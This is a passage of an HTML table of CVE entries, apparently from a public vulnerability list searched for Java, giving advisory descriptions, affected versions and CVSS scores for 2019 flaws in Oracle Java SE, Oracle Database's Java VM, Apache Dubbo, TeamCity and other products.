		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Kerberos). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via Kerberos to compromise Java SE, Java SE Embedded. While the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2945">CVE-2019-2945</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Networking). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2933">CVE-2019-2933</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2909">CVE-2019-2909</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java VM. While the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.0 Base Score 6.8 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2907">CVE-2019-2907</a></td>
		<td valign="top">Vulnerability in the Oracle Web Services product of Oracle Fusion Middleware (component: SOAP with Attachments API for Java). The supported version that is affected is 12.2.1.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Web Services. While the vulnerability is in Oracle Web Services, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Web Services accessible data as well as unauthorized read access to a subset of Oracle Web Services accessible data. CVSS 3.0 Base Score 7.2 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2894">CVE-2019-2894</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded product of Oracle Java SE (component: Security). Supported versions that are affected are Java SE: 7u231, 8u221, 11.0.4 and 13; Java SE Embedded: 8u221. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2862">CVE-2019-2862</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM Enterprise Edition component of Oracle GraalVM (subcomponent: Java). The supported version that is affected is 19.0.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle GraalVM Enterprise Edition accessible data and unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Oracle GraalVM Enterprise Edition. CVSS 3.0 Base Score 6.8 (Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2842">CVE-2019-2842</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JCE). The supported version that is affected is Java SE: 8u212. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2821">CVE-2019-2821</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JSSE). Supported versions that are affected are Java SE: 11.0.3 and 12.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2818">CVE-2019-2818</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 11.0.3 and 12.0.1. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2816">CVE-2019-2816</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 7u221, 8u212, 11.0.3 and 12.0.1; Java SE Embedded: 8u211. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded accessible data as well as unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2786">CVE-2019-2786</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 8u212, 11.0.3 and 12.0.1; Java SE Embedded: 8u211. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.4 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2769">CVE-2019-2769</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Utilities). Supported versions that are affected are Java SE: 7u221, 8u212, 11.0.3 and 12.0.1; Java SE Embedded: 8u211. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2766">CVE-2019-2766</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 7u221, 8u212, 11.0.3 and 12.0.1; Java SE Embedded: 8u211. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2762">CVE-2019-2762</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Utilities). Supported versions that are affected are Java SE: 7u221, 8u212, 11.0.3 and 12.0.1; Java SE Embedded: 8u211. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2749">CVE-2019-2749</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data and unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Java VM. CVSS 3.0 Base Score 6.8 (Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2745">CVE-2019-2745</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 7u221, 8u212 and 11.0.3. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Java SE executes to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2699">CVE-2019-2699</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Windows DLL). The supported version that is affected is Java SE: 8u202. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. While the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 9.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2698">CVE-2019-2698</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: 2D). Supported versions that are affected are Java SE: 7u211 and 8u202. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2697">CVE-2019-2697</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: 2D). Supported versions that are affected are Java SE: 7u211 and 8u202. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2684">CVE-2019-2684</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 7u211, 8u202, 11.0.2 and 12; Java SE Embedded: 8u201. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 5.9 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2602">CVE-2019-2602</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 7u211, 8u202, 11.0.2 and 12; Java SE Embedded: 8u201. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of Java SE, Java SE Embedded. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2547">CVE-2019-2547</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1 and 18c. Easily exploitable vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java VM. CVSS 3.0 Base Score 3.5 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2540">CVE-2019-2540</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.12. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java Advanced Management Console. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 6.1 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2518">CVE-2019-2518</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2, 12.2.0.1, 18c and 19c. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2449">CVE-2019-2449</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). The supported version that is affected is Java SE: 8u192. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2426">CVE-2019-2426</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 7u201, 8u192 and 11.0.1; Java SE Embedded: 8u191. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.0 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-2422">CVE-2019-2422</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 7u201, 8u192 and 11.0.1; Java SE Embedded: 8u191. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets (in Java SE 8), that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-20635">CVE-2019-20635</a></td>
		<td valign="top">codeBeamer before 9.5.0-RC3 does not properly restrict the ability to execute custom Java code and access the Java class loader via computed fields.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-19810">CVE-2019-19810</a></td>
		<td valign="top">Zoom Call Recording 6.3.1 from Eleveo is vulnerable to Java Deserialization attacks targeting the inbuilt RMI service. A remote unauthenticated attacker can exploit this vulnerability by sending crafted RMI requests to execute arbitrary code on the target host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-18956">CVE-2019-18956</a></td>
		<td valign="top">Divisa Proxia Suite 9 &lt; 9.12.16, 9.11.19, 9.10.26, 9.9.8, 9.8.43 and 9.7.10, 10.0 &lt; 10.0.32, and 10.1 &lt; 10.1.5, SparkSpace 1.0 &lt; 1.0.30, 1.1 &lt; 1.1.2, and 1.2 &lt; 1.2.4, and Proxia PHR 1.0 &lt; 1.0.30 and 1.1 &lt; 1.1.2 allows remote code execution via untrusted Java deserialization. The proxia-error cookie is insecurely deserialized in every request (GET or POST). Thus, an unauthenticated attacker can easily craft a seria1.0lized payload in order to execute arbitrary code via the prepareError function in the com.divisait.dv2ee.controller.MVCControllerServlet class of the dv2eemvc.jar component. allows remote code execution via untrusted Java deserialization. The proxia-error cookie is insecurely deserialized in every request (GET or POST). Thus, an unauthenticated attacker can easily craft a serialized payload in order to execute arbitrary code via the prepareError function in the com.divisait.dv2ee.controller.MVCControllerServlet class of the dv2eemvc.jar component. Affected products include Proxia Premium Edition 2017 and Sparkspace.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-18580">CVE-2019-18580</a></td>
		<td valign="top">Dell EMC Storage Monitoring and Reporting version 4.3.1 contains a Java RMI Deserialization of Untrusted Data vulnerability. A remote unauthenticated attacker may potentially exploit this vulnerability by sending a crafted RMI request to execute arbitrary code on the target host.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-18572">CVE-2019-18572</a></td>
		<td valign="top">The RSA Identity Governance and Lifecycle and RSA Via Lifecycle and Governance products prior to 7.1.1 P03 contain an Improper Authentication vulnerability. A Java JMX agent running on the remote host is configured with plain text password authentication. An unauthenticated remote attacker can connect to the JMX agent and monitor and manage the Java application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-18364">CVE-2019-18364</a></td>
		<td valign="top">In JetBrains TeamCity before 2019.1.4, insecure Java Deserialization could potentially allow remote code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-17664">CVE-2019-17664</a></td>
		<td valign="top">NSA Ghidra through 9.0.4 uses a potentially untrusted search path. When executing Ghidra from a given path, the Java process working directory is set to this path. Then, when launching the Python interpreter via the "Ghidra Codebrowser &gt; Window &gt; Python" option, Ghidra will try to execute the cmd.exe program from this working directory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-17564">CVE-2019-17564</a></td>
		<td valign="top">Unsafe deserialization occurs within a Dubbo application which has HTTP remoting enabled. An attacker may submit a POST request with a Java object in it to completely compromise a Provider instance of Apache Dubbo, if this instance enables HTTP. This issue affected Apache Dubbo 2.7.0 to 2.7.4, 2.6.0 to 2.6.7, and all 2.5.x versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-17359">CVE-2019-17359</a></td>
		<td valign="top">The ASN.1 parser in Bouncy Castle Crypto (aka BC Java) 1.63 can trigger a large attempted memory allocation, and resultant OutOfMemoryError error, via crafted ASN.1 data. This is fixed in 1.64.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2019-17063">CVE-2019-17063</a></td>
